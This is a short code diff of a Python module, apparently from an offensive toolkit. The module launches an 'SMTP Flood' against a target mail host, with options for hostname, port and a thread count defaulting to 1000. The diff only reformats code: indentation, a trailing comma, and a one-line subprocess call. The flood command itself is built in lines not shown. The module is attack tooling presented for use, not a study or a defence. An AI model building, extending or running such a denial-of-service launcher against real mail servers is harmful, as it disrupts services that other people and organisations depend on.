@@ -2,10 +2,11 @@ import subprocess
 import os
 
 REQUIRED_OPTIONS = {
-        "HOSTNAME": "ex: mail.storm.com",
-        "PORT": "ex: 25",
-        "THREAD": "ex: 1000"
+    "HOSTNAME": "ex: mail.storm.com",
+    "PORT": "ex: 25",
+    "THREAD": "ex: 1000",
 }
+
 
 def execute(options):
     target = str(options.get("HOSTNAME"))
@@ -29,11 +30,7 @@ def execute(options):
 
     print(f"[*] Starting SMTP Flood on {target}\n")
     try:
-        process = subprocess.Popen(
-            command,
-            stdout=None,
-            stderr=None
-        )
+        process = subprocess.Popen(command, stdout=None, stderr=None)
         process.wait()
     except KeyboardInterrupt:
         process.terminate()
